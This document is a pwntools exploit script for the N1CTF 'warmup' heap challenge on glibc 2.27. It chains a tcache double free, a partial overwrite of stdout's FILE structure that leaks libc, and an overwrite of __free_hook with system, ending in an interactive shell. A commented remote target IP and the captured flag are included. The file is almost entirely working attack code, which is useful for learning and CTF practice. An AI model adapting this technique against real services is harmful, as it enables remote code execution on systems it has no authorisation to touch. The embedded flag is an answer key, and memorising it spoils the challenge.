from pwn import *
import random


MENU = ("4.exit.\n"
        ">>")


def add(io, data):
    io.sendlineafter(MENU, "1")
    io.sendafter("content>>", data)
    #io.recvuntil("done!\n")


def delete(io, idx):
    io.sendlineafter(MENU, "2")
    io.sendlineafter("index:", str(idx))
    #io.recvuntil("done!\n")


def modify(io, idx, data):
    io.sendlineafter(MENU, "3")
    io.sendlineafter("index:", str(idx))
    io.sendafter("content>>", data)
    io.recvuntil("done!\n")


def exploit():

    LIBC = ELF("./libc-2.27.so")



    chunk  = p64(0x0)*3
    chunk += p64(0x91)
    chunk += p64(0x0)*6
    add(io, chunk)      #0

    add(io, '+')        #1

    chunk  = p64(0x0)
    chunk += p64(0x21)
    chunk += p64(0x0)*3
    chunk += p64(0x1)
    add(io, chunk)      #2


    delete(io, 1)
    delete(io, 1)
    delete(io, 0)
    delete(io, 0)


    add(io, p8(0x90)) # 0
    add(io, p64(0x00)) # 1

    #smallbin/fastbin
    add(io, p64(0x0)) # 3

    for i in range(0, 7):
        delete(io, 3)

    #revert to fastchunk
    chunk  = p64(0x0)*3
    chunk += p64(0x51)
    modify(io, 0, chunk)

    #we delete more so we can free
    #in the final part of the exploit
    for i in range(0, 5):
        delete(io, 0)
    add(io, p8(0x90)) #0
    add(io, p64(0x00)) #3

    add(io, p64(0x0)) # 4

    #revert back to smallchunk
    chunk  = p64(0x0)*3
    chunk += p64(0x91)
    modify(io, 0, chunk)

    delete(io, 4)

    """
    pid = io.pid
    maps = open("/proc/{}/maps".format(pid), "r").read()
    heapbase = 0x0
    libcbase = -1
    for i in maps.split("\n"):
      if "heap" in i and heapbase == 0:
        heapbase = int(i.split("-")[0], 16)
      if "libc" in i and libcbase == -1:
        libcbase = int(i.split("-")[0], 16)

    stdout = libcbase + 0x03ec760
    overwrite = stdout & 0x000000000000ffff

    print "libc", hex(libcbase)
    print "stdout", hex(stdout)
    print "bytes", hex(overwrite)
    """

    nibble = random.randint(0, 15)*0x1000
    number = nibble + 0x760
    #number = 0x9760
    overwrite = p16(number)
    log.warning("value {}".format(hex(number)))

    chunk = p64(0x0)*3
    chunk += p64(0x91)
    chunk += overwrite
    modify(io, 0, chunk)

    add(io, 'r')

    _file  = p64(0xfbad1800)
    _file += p64(0x0)*3
    _file += p8(0x0)
    add(io, _file)

    io.recv(0x58)
    _IO_file_jumps = u64(io.recv(6, timeout = 4).ljust(8, p8(0)))

    libc = _IO_file_jumps - LIBC.symbols["_IO_file_jumps"]
    free_hook = libc + LIBC.symbols["__free_hook"]
    system = libc + LIBC.symbols["system"]


    if libc & 0xfff != 0:
        io.close()
        return

    log.success("_IO_file_jumps {}".format(hex(_IO_file_jumps)))
    log.success("libc {}".format(hex(libc)))
    log.success("free_hook {}".format(hex(free_hook)))
    log.success("system {}".format(hex(system)))
    #overwrite free hook with system


    for i in range(0, 2):
        delete(io, 0)

    add(io, p64(free_hook-0x18))
    add(io, 'a')

    payload = "/bin/sh\x00"
    payload += 'B'*16
    payload += p64(system)
    add(io, payload)
    delete(io, 7)

    io.interactive()
    io.close()

while True:
    try:
        io = process("./warmup")
        #io = remote("47.52.90.3",9999)
        exploit()
    except KeyboardInterrupt:
        sys.exit()
    except Exception:
        io.close()
        continue

#N1CTF{0359e2a5bf6222aa34bb22b7c099adda}

